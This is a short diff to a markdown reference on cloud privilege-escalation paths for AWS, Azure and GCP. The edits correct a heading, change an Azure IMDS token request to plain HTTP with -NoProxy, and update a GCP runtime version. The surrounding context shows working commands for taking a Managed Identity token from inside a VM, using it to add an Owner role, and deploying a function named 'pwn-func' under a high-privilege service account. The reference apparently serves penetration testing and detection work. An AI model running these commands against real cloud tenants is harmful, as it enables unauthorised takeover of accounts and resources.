@@ -4,7 +4,7 @@ Detailed escalation paths per provider with exact CLI commands and detection sig
 
 ---
 
-## AWS — 31 confirmed paths (BishopFox / Rhino Security Labs)
+## AWS — Rhino Security Labs escalation paths (21 core + variants)
 
 ### Category: Policies on current identity
 
@@ -72,8 +72,8 @@ Highest-impact pattern: VM with Managed Identity assigned Owner/Contributor role
 # From inside VM — authenticate as Managed Identity
 az login --identity
 
-# Get token via IMDS (PowerShell)
-$token = (Invoke-WebRequest -Uri 'https://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata="true"} -UseBasicParsing).Content | ConvertFrom-Json
+# Get token via IMDS (PowerShell) — IMDS is HTTP only, non-routable
+$token = (Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata="true"} -UseBasicParsing -NoProxy).Content | ConvertFrom-Json
 
 # Add user to Owner role using REST API with Managed Identity token
 # (See NetSPI PoC: https://gist.github.com/kfosaaen/535a607e39fc9a63ec6798d99da132e8)
@@ -138,7 +138,7 @@ gcloud iam workload-identity-pools providers describe <provider> \
 ```bash
 # Create function with high-priv SA (requires iam:PassRole equivalent + cloudfunctions.functions.create)
 gcloud functions deploy pwn-func \
-  --runtime python39 \
+  --runtime python312 \
   --trigger-http \
   --service-account <high-priv-sa>@<project>.iam.gserviceaccount.com \
   --source <path>
